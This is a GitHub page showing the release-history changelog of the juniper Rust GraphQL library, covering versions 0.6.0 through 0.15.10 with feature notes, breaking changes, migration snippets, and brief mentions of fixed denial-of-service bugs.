=== Content from github.com_c40b0adf_20250108_125357.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgraphql-rust%2Fjuniper%2Fblob%2Fjuniper-v0.15.10%2Fjuniper%2FCHANGELOG.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgraphql-rust%2Fjuniper%2Fblob%2Fjuniper-v0.15.10%2Fjuniper%2FCHANGELOG.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=graphql-rust%2Fjuniper)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[graphql-rust](/graphql-rust)
/
**[juniper](/graphql-rust/juniper)**
Public

* [Notifications](/login?return_to=%2Fgraphql-rust%2Fjuniper) You must be signed in to change notification settings
* [Fork
  428](/login?return_to=%2Fgraphql-rust%2Fjuniper)
* [Star
   5.7k](/login?return_to=%2Fgraphql-rust%2Fjuniper)

* [Code](/graphql-rust/juniper/tree/juniper-v0.15.10)
* [Issues
  88](/graphql-rust/juniper/issues)
* [Pull requests
  16](/graphql-rust/juniper/pulls)
* [Discussions](/graphql-rust/juniper/discussions)
* [Actions](/graphql-rust/juniper/actions)
* [Security](/graphql-rust/juniper/security)
* [Insights](/graphql-rust/juniper/pulse)

Additional navigation options

* [Code](/graphql-rust/juniper/tree/juniper-v0.15.10)
* [Issues](/graphql-rust/juniper/issues)
* [Pull requests](/graphql-rust/juniper/pulls)
* [Discussions](/graphql-rust/juniper/discussions)
* [Actions](/graphql-rust/juniper/actions)
* [Security](/graphql-rust/juniper/security)
* [Insights](/graphql-rust/juniper/pulse)

## Files

 juniper-v0.15.10
## Breadcrumbs

1. [juniper](/graphql-rust/juniper/tree/juniper-v0.15.10)
2. /[juniper](/graphql-rust/juniper/tree/juniper-v0.15.10/juniper)
/
# CHANGELOG.md

 Blame  Blame
## Latest commit

## History

[History](/graphql-rust/juniper/commits/juniper-v0.15.10/juniper/CHANGELOG.md)854 lines (589 loc) · 33.8 KB juniper-v0.15.10
## Breadcrumbs

1. [juniper](/graphql-rust/juniper/tree/juniper-v0.15.10)
2. /[juniper](/graphql-rust/juniper/tree/juniper-v0.15.10/juniper)
/
# CHANGELOG.md

Top
## File metadata and controls

* Preview
* Code
* Blame

854 lines (589 loc) · 33.8 KB[Raw](https://github.com/graphql-rust/juniper/raw/refs/tags/juniper-v0.15.10/juniper/CHANGELOG.md)
# [[0.15.10] 2022-07-28](https://github.com/graphql-rust/juniper/releases/tag/juniper-v0.15.10)

* Fix [CVE-2022-31173](https://github.com/graphql-rust/juniper/security/advisories/GHSA-4rx6-g5vg-5f3j).
* Fix incorrect error when explicit `null` provided for `null`able list input parameter. ([#1086](https://github.com/graphql-rust/juniper/pull/1086))

# [[0.15.9] 2022-02-02](https://github.com/graphql-rust/juniper/releases/tag/juniper-v0.15.9)

* Fix infinite recursion on malformed queries with nested recursive fragments. *This is a potential denial-of-service attack vector.* Thanks to [@quapka](https://github.com/quapka) for the detailed vulnerability report and reproduction steps.

# [[0.15.8] 2022-01-26](https://github.com/graphql-rust/juniper/releases/tag/juniper-v0.15.8)

* Fix panic on malformed queries with recursive fragments. *This is a potential denial-of-service attack vector.* Thanks to [@quapka](https://github.com/quapka) for the detailed vulnerability report and reproduction steps.

# [[0.15.7] 2021-07-08](https://github.com/graphql-rust/juniper/releases/tag/juniper-v0.15.7)

* Fix panic on spreading untyped union fragments ([#945](https://github.com/graphql-rust/juniper/issues/945))

# [[0.15.6] 2021-06-07](https://github.com/graphql-rust/juniper/releases/tag/juniper-v0.15.6)

* Allow `RootNode::as_schema_language` and `RootNode::as_parser_document` for arbitrary type info ([#935](https://github.com/graphql-rust/juniper/pull/935))

# [[0.15.5] 2021-05-11](https://github.com/graphql-rust/juniper/releases/tag/juniper-v0.15.5)

* Fix multiple fragments on sub types overriding each other ([#927](https://github.com/graphql-rust/juniper/pull/915))
* Fix error extensions in subscriptions ([#927](https://github.com/graphql-rust/juniper/pull/927))
* Fix fields on interfaces not being resolved when used with fragments ([#923](https://github.com/graphql-rust/juniper/pull/923))

# [[0.15.4] 2021-04-03](https://github.com/graphql-rust/juniper/releases/tag/juniper-v0.15.4)

* Un-deprecate select\_child, has\_child, and child\_names methods ([#900](https://github.com/graphql-rust/juniper/pull/#900))

# [[0.15.3] 2021-01-27](https://github.com/graphql-rust/juniper/releases/tag/juniper-0.15.3)

* Compatibility with the latest `syn` ([#861](https://github.com/graphql-rust/juniper/pull/861))
* Fixed a regression in GraphQL Playground ([#856](https://github.com/graphql-rust/juniper/pull/856))

# [[0.15.2] 2021-01-15](https://github.com/graphql-rust/juniper/releases/tag/juniper-0.15.2)

* Update GraphQL Playground to v1.7.27.
* Add marker GraphQL trait implementations for Rust container types like `Box`([#847](https://github.com/graphql-rust/juniper/pull/847))

# [[0.15.1] 2020-12-12](https://github.com/graphql-rust/juniper/releases/tag/juniper-0.15.1)

* Support `Arc` in input and output objects. ([#822](https://github.com/graphql-rust/juniper/pull/822))

# [[0.15.0] 2020-12-09](https://github.com/graphql-rust/juniper/releases/tag/juniper-0.15.0)

## Features

* Added async support. ([#2](https://github.com/graphql-rust/juniper/issues/2))

  + `execute()` is now async. Synchronous execution can still be used via `execute_sync()`.
  + Field resolvers may optionally be declared as `async` and return a future.
* Added *experimental* support for GraphQL subscriptions. ([#433](https://github.com/graphql-rust/juniper/pull/433))
* Added support for generating the [GraphQL Schema Language](https://graphql.org/learn/schema/#type-language) representation of a schema using `RootNode::as_schema_language()`. ([#676](https://github.com/graphql-rust/juniper/pull/676))

  + This is controlled by the `schema-language` feature and is on by default. It may be turned off if you do not need this functionality to reduce dependencies and speed up compile times.
  + Note that this is for generating the GraphQL Schema Language representation from the Rust schema. For the opposite--generating a Rust schema from a GraphQL Schema Language file--see the [`juniper_from_schema`](https://github.com/davidpdrsn/juniper-from-schema) project.
* Most GraphQL spec violations are now caught at compile-time. ([#631](https://github.com/graphql-rust/juniper/pull/631))

  + The enhanced error messages now include the reason and a link to the spec.
    For example, if you try to declare a GraphQL object with no fields:
    ```
      error: GraphQL object expects at least one field
     --> $DIR/impl_no_fields.rs:4:1
      |
    4 | impl Object {}
      | ^^^^^^^^^^^^^^
      |
      = note: https://spec.graphql.org/June2018/#sec-Objects
    ```
* [Raw identifiers](https://doc.rust-lang.org/edition-guide/rust-2018/module-system/raw-identifiers.html) are now supported in field and argument names.
* Most error types now implement `std::error::Error`. ([#419](https://github.com/graphql-rust/juniper/pull/419))

  + `GraphQLError`
  + `LexerError`
  + `ParseError`
  + `RuleError`
* Support `chrono-tz::Tz` scalar behind a `chrono-tz` feature flag. ([#519](https://github.com/graphql-rust/juniper/pull/519))
* Added support for distinguishing between between implicit and explicit null. ([#795](https://github.com/graphql-rust/juniper/pull/795))
* Implement `IntoFieldError` for `std::convert::Infallible`. ([#796](https://github.com/graphql-rust/juniper/pull/796))
* Allow using `#[graphql(Scalar = DefaultScalarValue)]` for derive macro `GraphQLScalarValue` ([#807](https://github.com/graphql-rust/juniper/pull/807))

## Fixes

* Massively improved the `#[graphql_union]` proc macro. ([#666](https://github.com/graphql-rust/juniper/pull/666)):

  + Applicable to traits.
  + Supports custom resolvers.
  + Supports generics.
  + Supports multiple `#[graphql_union]` attributes.
* Massively improved the `#[derive(GraphQLUnion)]` macro. ([#666](https://github.com/graphql-rust/juniper/pull/666)):

  + Applicable to enums and structs.
  + Supports custom resolvers.
  + Supports generics.
  + Supports multiple `#[graphql]` attributes.
* Massively improved the `#[graphql_interface]` macro. ([#682](https://github.com/graphql-rust/juniper/pull/682)):

  + Applicable to traits and generates enum or trait object to represent a GraphQL interface (see the [example of migration from `graphql_interface!` macro](https://github.com/graphql-rust/juniper/commit/3472fe6d10d23472752b1a4cd26c6f3da767ae0e#diff-3506bce1e02051ceed41963a86ef59d660ee7d0cd26df1e9c87372918e3b01f0)).
  + Supports passing context and executor to a field resolver.
  + Supports custom downcast functions and methods.
  + Supports generics.
  + Supports multiple `#[graphql_interface]` attributes.
* The `GraphQLEnum` derive now supports specifying a custom context. ([#621](https://github.com/graphql-rust/juniper/pull/621))

  + Example:
  ```
  #[derive(juniper::GraphQLEnum)]
  #[graphql(context = CustomContext)]
  enum TestEnum {
      A,
  }
  ```
* Added support for renaming arguments within a GraphQL object. ([#631](https://github.com/graphql-rust/juniper/pull/631))

  + Example:
  ```
    #[graphql(arguments(argA(name = "test")))]
  ```
* `SchemaType` is now public.

  + This is helpful when using `context.getSchema()` inside of your field resolvers.
* Improved lookahead visibility for aliased fields. ([#662](https://github.com/graphql-rust/juniper/pull/662))
* When enabled, the optional `bson` integration now requires `bson-1.0.0`. ([#678](https://github.com/graphql-rust/juniper/pull/678))
* Fixed panic on `executor.look_ahead()` for nested fragments ([#500](https://github.com/graphql-rust/juniper/issues/500))

## Breaking Changes

* `GraphQLType` trait was split into 2 traits: ([#685](https://github.com/graphql-rust/juniper/pull/685))

  + An object-safe `GraphQLValue` trait containing resolving logic.
  + A static `GraphQLType` trait containing GraphQL type information.
* `juniper::graphiql` has moved to `juniper::http::graphiql`.

  + `juniper::http::graphiql::graphiql_source()` now requires a second parameter for subscriptions.
* Renamed the `object` proc macro to `graphql_object`.
* Removed the `graphql_object!` macro. Use the `#[graphql_object]` proc macro instead.
* Made `#[graphql_object]` macro to generate code generic over `ScalarValue` by default. ([#779](https://github.com/graphql-rust/juniper/pull/779))
* Renamed the `scalar` proc macro to `graphql_scalar`.
* Removed the `graphql_scalar!` macro. Use the `#[graphql_scalar]` proc macro instead.
* Removed the deprecated `ScalarValue` custom derive. Use `GraphQLScalarValue` instead.
* Removed the `graphql_interface!` macro. Use the `#[graphql_interface]` proc macro instead.
* Removed the `graphql_union!` macro. Use the `#[graphql_union]` proc macro or custom resolvers for the `#[derive(GraphQLUnion)]` instead.
* The `#[derive(GraphQLUnion)]` macro no longer generates `From` impls for enum variants. ([#666](https://github.com/graphql-rust/juniper/pull/666))

  + Consider using the [`derive_more`](/graphql-rust/juniper/blob/juniper-v0.15.10/juniper/https/docs.rs/derive_more) crate directly.
* The `ScalarRefValue` trait has been removed as it was not required.
* Prefixing variables or fields with an underscore now matches Rust's behavior. ([#684](https://github.com/graphql-rust/juniper/pull/684))
* The return type of `GraphQLType::resolve()` has been changed to `ExecutionResult`.

  + This was done to unify the return type of all resolver methods. The previous `Value` return type was just an internal artifact of
    error handling.
* Subscription-related:

  + Add subscription type to `RootNode`.
  + Add subscription endpoint to `playground_source()`.
  + Add subscription endpoint to `graphiql_source()`.
* Specifying a scalar type via a string is no longer supported. ([#631](https://github.com/graphql-rust/juniper/pull/631))

  + For example, instead of `#[graphql(scalar = "DefaultScalarValue")]` use `#[graphql(scalar = DefaultScalarValue)]`. *Note the lack of quotes*.
* Integration tests:

  + Renamed `http::tests::HTTPIntegration` as `http::tests::HttpIntegration`.
  + Added support for `application/graphql` POST request.
* `RootNode::new()` now returns `RootNode` parametrized with `DefaultScalarValue`. For custom `ScalarValue` use `RootNode::new_with_scalar_value()` instead. ([#779](https://github.com/graphql-rust/juniper/pull/779))
* When using `LookAheadMethods` to access child selections, children are always found using their alias if it exists rather than their name. ([#662](https://github.com/graphql-rust/juniper/pull/662))

  + These methods are also deprecated in favor of the new `LookAheadMethods::children()` method.

# [[0.14.2] 2019-12-16](https://github.com/graphql-rust/juniper/releases/tag/juniper-0.14.2)

* Fix incorrect validation with non-executed operations [#455](https://github.com/graphql-rust/juniper/issues/455)
* Correctly handle raw identifiers in field and argument names.

# [[0.14.1] 2019-10-24](https://github.com/graphql-rust/juniper/releases/tag/juniper-0.14.1)

* Fix panic when an invalid scalar is used by a client [#434](https://github.com/graphql-rust/juniper/pull/434)
* `EmptyMutation` now implements `Send` [#443](https://github.com/graphql-rust/juniper/pull/443)

# [[0.14.0] 2019-09-29](https://github.com/graphql-rust/juniper/releases/tag/juniper-0.14.0)

* Require `url` 2.x if `url` feature is enabled.
* Improve lookahead visitability.
* Add ability to parse 'subscription'.

# [[0.13.1] 2019-07-29](https://github.com/graphql-rust/juniper/releases/tag/juniper-0.13.1)

* Fix a regression when using lookaheads with fragments containing nested types [#404](https://github.com/graphql-rust/juniper/pull/404)
* Allow `mut` arguments for resolver functions in `#[object]` macros [#402](https://github.com/graphql-rust/juniper/pull/402)

# [[0.13.0] 2019-07-19](https://github.com/graphql-rust/juniper/releases/tag/juniper-0.13.0)

### newtype ScalarValue derive

See [#345](https://github.com/graphql-rust/juniper/pull/345).

The newtype pattern can now be used with the `GraphQLScalarValue` custom derive
to easily implement custom scalar values that just wrap another scalar,
similar to serdes `#[serde(transparent)]` functionality.

Example:

```
#[derive(juniper::GraphQLScalarValue)]
struct UserId(i32);
```

### Other Changes

* The `ID` scalar now implements Serde's `Serialize` and `Deserialize`
* Add support for `dyn` trait object syntax to procedural macros

# [[0.12.0] 2019-05-16](https://github.com/graphql-rust/juniper/releases/tag/juniper-0.12.0)

### object macro

The `graphql_object!` macro is deprecated and will be removed in the future.
It is replaced by the new [object](https://docs.rs/juniper/latest/juniper/macro.object.html) procedural macro.

[#333](https://github.com/graphql-rust/juniper/pull/333)

### 2018 Edition

All crates were refactored to the Rust 2018 edition.

This should not have any impact on your code, since juniper already was 2018 compatible.

[#345](https://github.com/graphql-rust/juniper/pull/345)

### Other changes

* The minimum required Rust version is now `1.34.0`.
* The `GraphQLType` impl for () was removed to improve compile time safefty. [#355](https://github.com/graphql-rust/juniper/pull/355)
* The `ScalarValue` custom derive has been renamed to `GraphQLScalarValue`.
* Added built-in support for the canonical schema introspection query via
  `juniper::introspect()`.
  [#307](https://github.com/graphql-rust/juniper/issues/307)
* Fix introspection query validity
  The DirectiveLocation::InlineFragment had an invalid literal value,
  which broke third party tools like apollo cli.
* Added GraphQL Playground integration.
  The `DirectiveLocation::InlineFragment` had an invalid literal value,
  which broke third party tools like apollo cli.
* The return type of `value::object::Object::iter/iter_mut` has changed to `impl Iter`. [#312](https://github.com/graphql-rust/juniper/pull/312)
* Add `GraphQLRequest::operation_name` [#353](https://github.com/graphql-rust/juniper/pull/353)

# [0.11.1] 2018-12-19

## Changes

* The minimum required Rust version is now `1.30`.
* All macros and the custom derives now support the macro system changes properly
  and also support Rust 2018 edition crates.

  [#298](https://github.com/graphql-rust/juniper/pull/298)

# [0.11.0] 2018-12-17

## Changes

* The minimum required Rust version is now `1.30.0`.

  [#271](https://github.com/graphql-rust/juniper/pull/271)
* Juniper is now generic about the exact representation of scalar values. This
  allows downstream crates to add support for own scalar value representations.

  There are two use cases for this feature:

  + You want to support new scalar types not representable by the provided default
    scalar value representation like for example `i64`
  + You want to support a type from a third party crate that is not supported by juniper

  **Note:** This may need some changes in down stream code, especially if working with
  generic code. To retain the current behaviour use `DefaultScalarValue` as scalar value type

  [#251](https://github.com/graphql-rust/juniper/pull/251)
* The `GraphQLObject` and `GraphQLEnum` derives will mark graphql fields as
  `@deprecated` when struct fields or enum variants are marked with the
  builtin `#[deprecated]` attribute.

  The deprecation reason can be set using the `note = ...` meta item
  (e.g. `#[deprecated(note = "Replaced by betterField")]`).
  The `since` attribute is ignored.

  [#269](https://github.com/graphql-rust/juniper/pull/269)

* There is an alternative syntax for setting a field's *description* and
  *deprecation reason* in the `graphql_object!` and `graphql_interface!` macros.

  To **deprecate** a graphql field:

  ```
  // Original syntax for setting deprecation reason
  field deprecated "Reason" my_field() -> { ... }

  // New alternative syntax for deprecation reason.
  #[deprecated(note = "Reason")]
  field my_field() -> { ... }

  // You can now also deprecate without a reason.
  #[deprecated]
  field my_field() -> { ... }
  ```

  To set the **description** of a graphql field:

  ```
  // Original syntax for field descriptions
  field my_field() as "Description" -> { ... }

  // Original syntax for argument descriptions
  field my_field(
    floops: i32 as "The number of starfish to be returned. \
                    Can't be more than 100.",
  ) -> {
    ...
  }

  // New alternative syntax for field descriptions
  /// Description
  field my_field() -> { ... }

  // New alternative syntax for argument descriptions
  field my_field(
    /// The number of starfish to be returned.
    /// Can't be more than 100.
    arg: i32,
  ) -> {
    ...
  }

  // You can also use raw strings and const &'static str.
  //
  // Multiple docstrings will be collapsed into a single
  // description separated by newlines.
  /// This is my field.
  ///
  /// Make sure not to filtz the bitlet.
  /// Flitzing without a bitlet has undefined behaviour.
  ///
  #[doc = my_consts::ADDED_IN_VERSION_XYZ]
  field my_field() -> { ... }
  ```

  [#269](https://github.com/graphql-rust/juniper/pull/269)

# [0.10.0] 2018-09-13

## Changes

* Changed serialization of `NaiveDate` when using the optional `chronos` support.

  **Note:** while this is not a Rust breaking change, if you relied on the serialization format (perhaps by storing serialized data in a database or making asumptions in your client code written in another language) it could be a breaking change for your application.

  [#151](https://github.com/graphql-rust/juniper/pull/151)
* The `GraphQLObject`, `GraphQLInputObject`, and `GraphQLEnum` custom derives will reject
  invalid [names](http://facebook.github.io/graphql/October2016/#Name) at compile time.

  [#170](https://github.com/graphql-rust/juniper/pull/170)
* Large integers (> signed 32bit) are now deserialized as floats. Previously,
  they produced an "integer out of range" error. For languages that do not
  have a distinction between integer and floating point types (such as
  javascript), this meant large whole floating point values could not be
  decoded (because they were represented without a fractional value such as `.0`).

  [#179](https://github.com/graphql-rust/juniper/pull/179)
* The `GraphQLObject`, `GraphQLInputObject`, and `GraphQLEnum` custom derives
  now parse doc strings and use them as descriptions. This behavior can be
  overridden by using an explicit GraphQL `description` annotation such as
  `#[graphql(description = "my description")]`. [View documentation](https://graphql-rust.github.io/types/objects/defining_objects.html#defining-objects).

  [#194](https://github.com/graphql-rust/juniper/issues/194)
* Introduced `IntoFieldError` trait to allow custom error handling
  i.e. custom result type. The error type must implement this trait resolving
  the errors into `FieldError`. [View documentation](https://graphql-rust.github.io/types/objects/error_handling.html#structured-errors).

  [#40](https://github.com/graphql-rust/juniper/issues/40)
* `GraphQLType` and `ToInputValue` are now implemented for Arc

  [#212](https://github.com/graphql-rust/juniper/pull/212)
* Error responses no longer have a *data* field, instead, error details are stored in the *extensions* field

  **Note:** while this is a breaking change, it is a necessary one to better align with the latest [GraphQL June 2018](https://facebook.github.io/graphql/June2018/#sec-Errors) specification, which defines the reserved *extensions* field for error details. [View documentation](https://graphql-rust.github.io/types/objects/error_handling.html#structured-errors).

  [#219](https://github.com/graphql-rust/juniper/pull/219)

* The `GraphQLObject` and `GraphQLInputObject` custom derives
  now support lifetime annotations.

  [#225](https://github.com/graphql-rust/juniper/issues/225)
* When using the `GraphQLObject` custom derive, fields can now be omitted by annotating the field with `#[graphql(skip)]`. [View documentation](https://graphql-rust.github.io/types/objects/defining_objects.html#skipping-fields).

  [#220](https://github.com/graphql-rust/juniper/issues/220)
* Due to newer dependencies, the oldest Rust version supported is now 1.22.0

  [#231](https://github.com/graphql-rust/juniper/pull/231)

# [0.9.2] 2018-01-13

## Changes

### `__typename` for unions

The [`__typename`](http://graphql.org/learn/queries/#meta-fields) query meta-field now works on unions.

[#112](https://github.com/graphql-rust/juniper/issues/112)

### Debug impls.

http::GraphQLRequest now implements `Debug`.

# [0.9.0] 2017-12-03

## Changes

This is the first release in a long time.
Quite a few changes have accumulated since `0.8.1`, including multiple breaking
changes.

### Custom derive & macros

Juniper has gained custom derive implementations for input objects, objects and
enums.

* `#[derive(GraphQLInputObject)]`
* `#[derive(GraphQLEnum)]`
* `#[derive(GraphQLObject)]`

The `graphql_enum!` and `graphql_input_object!` macros did not provide any more
benefits, so they have been removed!
All functionality is now covered by custom derive.
Check the [docs](https://graphql-rust.github.io) to find out more.

### Web framework integrations - Iron & Rocket

The iron and rocket integrations were removed from the main crate, and are now
available via the [juniper\_iron](https://crates.io/crates/juniper_iron) and
[juniper\_rocket](https://crates.io/crates/juniper_rocket) crates.

### FieldError rewrite (custom data)

The `FieldError` type now supports custom data with the `Value` type from
serde\_json. Use this to populate the `data` field in returned errors.

This also means that try! and `?` now work in resolvers, which is quite nice.

Also, the `ResultExt` extension and the `jtry!` macro were removed, since they
are redundant now!

### Dynamic Schemas

Juniper has gained support for dynamic schemas, thanks to @srijs.

That also means the type of `RootNode` has changed to include a lifetime.

The repository was restructured to a multi crate workspace to enable several new
features like custom\_derive and an extracted parser.

#[#66](https://github.com/graphql-rust/juniper/pull/66)

### Data Type Integrations

Integrations with multiple popular crates was added to make working with them
easier.

* uuid
* url
* chrono

### Field Order

To better comply with the specification, order of requested fields is
now preserved.

[#82]([#82](https://github.com/graphql-rust/juniper/issues/82)

### From/ToInputValue

The `::from` and `::to` methods in `From/ToInputValue` were renamed to
`from/to_input_value()` to not conflict with other methods.

[#90](https://github.com/graphql-rust/juniper/pull/90)

### Other changes

* Several small performance improvements
* Use [fnv](https://github.com/servo/rust-fnv) hash map for better performance

## Contributors

A big shoutout to the many contributors for this version, sorted alphabetically.

* Cameron Eldridge mailto:cameldridge+git@gmail.com
* Christian Legnitto mailto:christian@legnitto.com
* Jacob Haslehurst mailto:jacob@haslehurst.net
* Jane Keibler mailto:wanderingelf14@gmail.com
* Magnus Hallin mailto:mhallin@fastmail.com
* rushmorem mailto:rushmore@webenchanter.com
* Rushmore Mushambi mailto:rushmore@webenchanter.com
* Sagie Gur-Ari mailto:sagiegurari@gmail.com
* Sam Rijs mailto:srijs@airpost.net
* Stanko Krtalić mailto:stanko.krtalic@gmail.com
* theduke mailto:chris@theduke.at
* thomas-jeepe mailto:penguinSoccer@outlook.com

# [0.8.1](https://github.com/graphql-rust/juniper/compare/0.8.0...0.8.1) – 2017-06-15

Tiny release to fix broken crate metadata on crates.io.

# [0.8.0](https://github.com/graphql-rust/juniper/compare/0.7.0...0.8.0) – 2017-06-15

## Breaking changes

* To better comply with the specification, and to avoid weird bugs with very
  large positive or negative integers, support for `i64` has been completely
  dropped and replaced with `i32`. `i64` is no longer a valid GraphQL type in
  Juniper, and `InputValue`/`Value` can only represent 32 bit integers.

  If an incoming integer is out of range for a 32 bit signed integer type, an
  error will be returned to the client.
  ([#52](https://github.com/graphql-rust/juniper/issues/52),
  [#49](https://github.com/graphql-rust/juniper/issues/49))
* Serde has been updated to 1.0. If your application depends on an older
  version, you will need to first update your application before you can upgrade
  to a more recent Juniper. ([#43](https://github.com/graphql-rust/juniper/pull/43))
* `rustc_serialize` support has been dropped since this library is now
  deprecated. ([#51](https://github.com/graphql-rust/juniper/pull/51))

## New features

* A new `rocket-handlers` feature now includes some tools to use the
  [Rocket](https://rocket.rs) framework. [A simple
  example](/graphql-rust/juniper/blob/juniper-v0.15.10/juniper/juniper_rocket/examples/rocket-server.rs) has been added to the examples folder.

## Bugfixes

* A panic in the parser has been replaced with a proper error
  ([#44](https://github.com/graphql-rust/juniper/pull/44))

# [0.7.0](https://github.com/graphql-rust/juniper/compare/0.6.3...0.7.0) – 2017-02-26

### Breaking changes

* The `iron-handlers` feature now depends on Iron 0.5
  ([#30](https://github.com/graphql-rust/juniper/pull/30)). Because of
  this, support for Rust 1.12 has been dropped. It might still work if
  you're not using the Iron integrations feature, however.

### New features

* Input objects defined by the `graphql_input_object!` can now be used
  as default values to field arguments and other input object fields.

# [0.6.3](https://github.com/graphql-rust/juniper/compare/0.6.2...0.6.3) – 2017-02-19

### New features

* Add support for default values on input object fields
  ([#28](https://github.com/graphql-rust/juniper/issues/28))

# [0.6.2](https://github.com/graphql-rust/juniper/compare/0.6.1...0.6.2) – 2017-02-05

### New features

* The `null` literal is now supported in the GraphQL
  language. ([#26](https://github.com/graphql-rust/juniper/pull/26))
* Rustc-serialize is now optional, but enabled by default. If you
  *only* want Serde support, include Juniper without default features
  and enable
  Serde. ([#12](https://github.com/graphql-rust/juniper/pull/12))
* The built-in `ID` type now has a public constructor and derives a
  few traits (`Clone`, `Debug`, `Eq`, `PartialEq`, `From<String>`,
  `Deref<Target=str>`). ([#19](https://github.com/graphql-rust/juniper/pull/19))
* Juniper is now built and tested against all Rust compilers since
  version 1.12.1.

### Minor breaking change

* Serde has been updated to
  0.9. ([#25](https://github.com/graphql-rust/juniper/pull/25))

### Bugfixes

* The built-in GraphiQL handler had a bug in variable serialization.
  ([#16](https://github.com/graphql-rust/juniper/pull/16))
* The example should now build and run without problems on
  Windows. ([#15](https://github.com/graphql-rust/juniper/pull/15))
* Object types now properly implement
  `__typename`. ([#22](https://github.com/graphql-rust/juniper/pull/22))
* String variables are now properly parsed into GraphQL
  enums. ([#17](https://github.com/graphql-rust/juniper/pull/17))

# [0.6.1](https://github.com/graphql-rust/juniper/compare/0.6.0...0.6.1) – 2017-01-06

### New features

* Optional Serde support
  ([#8](https://github.com/graphql-rust/juniper/pull/8))

### Improvements

* The `graphql_input_object!` macro can now be used to define input
  objects as public Rust structs.
* GraphiQL in the Iron GraphiQL handler has been updated to 0.8.1
  (#[#11](https://github.com/graphql-rust/juniper/pull/11))

### Minor breaking changes

Some undocumented but public APIs were changed.

* `to_snake_case` correctly renamed to `to_camel_case`
  ([#9](https://github.com/graphql-rust/juniper/pull/9))
* JSON serialization of `GraphQLError` changed to be more consistent
  with how other values were serialized
  ([#10](https://github.com/graphql-rust/juniper/pull/10)).

# [0.6.0](https://github.com/graphql-rust/juniper/compare/0.5.3...0.6.0) – 2017-01-02

TL;DR: Many big changes in how context types work and how they
interact with the executor. Not too much to worry about if you're only
using the macros and not deriving `GraphQLType` directly.

### Breaking changes

* The `executor` argument in all resolver methods is now
  immutable. The executor instead uses interior mutability to store
  errors in a thread-safe manner.

  This change could open up for asynchronous or multi-threaded
  execution: you can today use something like rayon in your resolve
  methods to let child nodes be concurrently resolved.

  **How to fix:** All field resolvers that looked like `field name(&mut executor` now should say `field name(&executor`.
* The context type of `GraphQLType` is moved to an associated type;
  meaning it's no longer generic. This only affects people who
  implement the trait manually, *not* macro users.

  This greatly simplifies a lot of code by ensuring that there only
  can be one `GraphQLType` implementation for any given Rust
  type. However, it has the downside that support for generic contexts
  previously used in scalars, has been removed. Instead, use the new
  context conversion features to accomplish the same task.

  **How to fix:** Instead of `impl GraphQLType<MyContext> for ...`,
  you use `impl GraphQLType for ... { type Context = MyContext;`.
* All context types must derive the `Context` marker trait. This is
  part of an overarching change to allow different types to use
  different contexts.

  **How to fix:** If you have written e.g. `graphql_object!(MyType: MyContext ...)` you will need to add `impl Context for MyContext {}`. Simple as that.
* `Registry` and all meta type structs now takes one lifetime
  parameter, which affects `GraphQLType`'s `meta` method. This only
  affects people who implement the trait manually.

  **How to fix:** Change the type signature of `meta()` to read `fn meta<'r>(registry: &mut Registry<'r>) -> MetaType<'r>`.
* The type builder methods on `Registry` no longer return functions
  taking types or fields. Due to how the borrow checker works with
  expressions, you will have to split up the instantiation into two
  statements. This only affects people who implement the `GraphQLType`
  trait manually.

  **How to fix:** Change the contents of your `meta()` methods to
  something like this:

  ```
  fn meta<'r>(registry: &mut Registry<r>) -> MetaType<'r> {
      let fields = &[ /* your fields ... */ ];

